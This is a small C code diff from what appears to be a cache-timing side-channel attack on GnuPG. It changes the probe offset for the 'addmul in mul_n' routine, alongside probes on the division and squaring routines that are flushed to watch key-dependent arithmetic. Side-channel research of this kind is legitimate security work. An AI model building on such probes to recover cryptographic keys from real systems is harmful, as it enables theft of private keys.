@@ -78,7 +78,7 @@ int main() {
     }
 
     char *modulo = (char *)(((uintptr_t)(gpg + addrs.div + 0x234)) & ~0x3fUL);  // divq instruction in loop
-    char *mul = (char *)(((uintptr_t)(gpg + addrs.mul + 0x60)) & ~0x3fUL);      // addmul in mul_n
+    char *mul = (char *)(((uintptr_t)(gpg + addrs.mul + 0xb0)) & ~0x3fUL);      // addmul in mul_n
     char *sqr = (char *)(((uintptr_t)(gpg + addrs.sqr + 0x133)) & ~0x3fUL);     // call to sqr_n_basecase
     
     flush(sqr);
